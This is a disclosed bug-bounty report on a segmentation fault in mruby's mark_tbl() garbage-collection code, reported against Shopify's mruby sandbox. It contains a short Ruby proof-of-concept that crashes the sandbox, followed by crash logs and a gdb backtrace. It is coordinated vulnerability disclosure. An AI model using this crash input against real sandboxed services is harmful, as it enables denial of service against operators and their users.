# SIGSEGV on mruby's mark_tbl() (Invalid memory access)

## Report Details
- **Report ID**: 183239
- **URL**: https://hackerone.com/reports/183239
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-18T05:04:03.540Z
- **Disclosed**: 2016-12-17T02:29:27.988Z

## Reporter
- **Username**: jpenalbae
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
There is an invalid memory access on mruby when calling to `mark_tbl()` which causes a SIGSEGV and leads to denial of service.

## Sample

The following code triggers the bug (attached as mark_tbl.min2.rb):
```ruby
t0me=%
Array.new(9){t0me.empty?s=Array.new(9){%{}*0
s=Array.dup.new(23)
Array(0)}
Array(0..6)}
```

## Crash

Here we can see the crash (full crash output attached)

```
$ bin/sandbox /tmp/mark_tbl.min2.rb
bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000017
ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:0011d8 EVAL   bin/sandbox:21 [FINISH]
c:0001 p:0000 s:0002 E:001470 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:21:in `<main>'
bin/sandbox:21:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007f95a747dea7 RBP: 0x0000000000000311 RSP: 0x00007f95a5fd4e10
 RAX: 0x0000000000000008 RBX: 0x00007f95a5fd74e0 RCX: 0x00007f95a746b4ef
 RDX: 0x00007f95a74d3234 RDI: 0x00007f95a5fd74e0 RSI: 0x00007f95a60274e0
  R8: 0x0000000000000008  R9: 0x0000000000000001 R10: 0x0000000000000000
 R11: 0x0000000000000000 R12: 0x0000000000000017 R13: 0x0000000000000001
 R14: 0x00007f95a60274e0 R15: 0x0000000000000002 EFL: 0x0000000000010206

-- C level backtrace information -------------------------------------------
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab76fea5]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab7700dc]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab64a364]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab6fbdbe]
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f95ab3ceed0]
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_gc_mark_iv+0x17) [0x7f95a747dea7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:402
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(incremental_gc.part.10+0x1da) [0x7f95a746b4fa] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:604
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_incremental_gc+0x1f3) [0x7f95a746bed3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1062
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_obj_alloc+0xfd) [0x7f95a746c58d] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:486
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0x53) [0x7f95a74548f3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1298
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_run+0x17) [0x7f95a746cbf7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_with_block+0x2fc) [0x7f95a746cefc] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0xb0) [0x7f95a7454950] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_run+0x17) [0x7f95a746cbf7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_with_block+0x2fc) [0x7f95a746cefc] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0xb0) [0x7f95a7454950] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f95a7448173] ../../../../ext/mruby_engine/eval_monitored.c:68
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f95ab3c5464]
/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f95aa74130d]
```

## Crash debug
```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mark_tbl.min2.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff5700 (LWP 5190)]
[New Thread 0x7ffff2348700 (LWP 5242)]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2348700 (LWP 5242)]
mark_tbl (t=0x17, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:403
403         iv_foreach(mrb, t, iv_mark_i, 0);
(gdb) x/1i $rip
=> 0x7ffff37efea7 <mrb_gc_mark_iv+23>:  mov    r8d,DWORD PTR [r12]
(gdb) i r r12
r12            0x17     23
(gdb) list *$rip
0x7ffff37efea7 is in mrb_gc_mark_iv (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:354).
349       khash_t(iv) *h = &t->h;
350       khiter_t k;
351       int n;
352
353       if (h) {
354         for (k = kh_begin(h); k != kh_end(h); k++) {
355           if (kh_exist(h, k)) {
356             n = (*func)(mrb, kh_key(h, k), kh_value(h, k), p);
357             if (n > 0) return FALSE;
358             if (n < 0) {
```

Backtrace
```
(gdb) bt
#0  mark_tbl (t=0x17, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:403
#1  mrb_gc_mark_iv (mrb=mrb@entry=0x7ffff23494e0, obj=obj@entry=0x7ffff23994e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:423
#2  0x00007ffff37dd4fa in gc_mark_children (gc=0x7ffff23495b8, obj=<optimized out>, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:604
#3  gc_gray_mark (obj=<optimized out>, gc=0x7ffff23495b8, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:834
#4  incremental_marking_phase (limit=<optimized out>, gc=<optimized out>, mrb=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:929
#5  incremental_gc (mrb=mrb@entry=0x7ffff23494e0, gc=gc@entry=0x7ffff23495b8, limit=limit@entry=2000) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1028
#6  0x00007ffff37dded3 in incremental_gc (limit=<optimized out>, gc=<optimized out>, mrb=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1062
#7  incremental_gc_step (gc=0x7ffff23495b8, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1063
#8  mrb_incremental_gc (mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1107
#9  0x00007ffff37de58d in mrb_obj_alloc (mrb=mrb@entry=0x7ffff23494e0, ttype=ttype@entry=MRB_TT_OBJECT, cls=cls@entry=0x7ffff2399420) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:486
#10 0x00007ffff37c68f3 in mrb_instance_alloc (cv=..., mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1298
#11 mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1322
#12 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff234fed0, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
#13 0x00007ffff37e6567 in mrb_vm_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., stack_keep=3) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#14 0x00007ffff37debf7 in mrb_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., self@entry=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442
#15 0x00007ffff37deefc in mrb_funcall_with_block (mrb=mrb@entry=0x7ffff23494e0, self=..., self@entry=..., mid=<optimized out>, argc=<optimized out>, argc@entry=1, argv=argv@entry=0x7ffff235bb70, blk=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414
#16 0x00007ffff37c6950 in mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323
#17 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff234fed0, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
#18 0x00007ffff37e6567 in mrb_vm_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., stack_keep=3) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#19 0x00007ffff37debf7 in mrb_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., self@entry=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442
#20 0x00007ffff37deefc in mrb_funcall_with_block (mrb=mrb@entry=0x7ffff23494e0, self=..., self@entry=..., mid=<optimized out>, argc=<optimized out>, argc@entry=1, argv=argv@entry=0x7ffff235bb18, blk=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414
#21 0x00007ffff37c6950 in mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323
#22 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351520, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
#23 0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351520, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#24 0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
#25 0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333
#26 0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
```


## Impact

Its impact seems to be limited to DoS of the service running the ruby sandbox. The invalid address can be controlled by the user but in a really limited way, so I doubut this chould be turned into a write-what-where type vuln.

## Attachments
- mark_tbl.min2.rb
- mark_tbl.crash.log
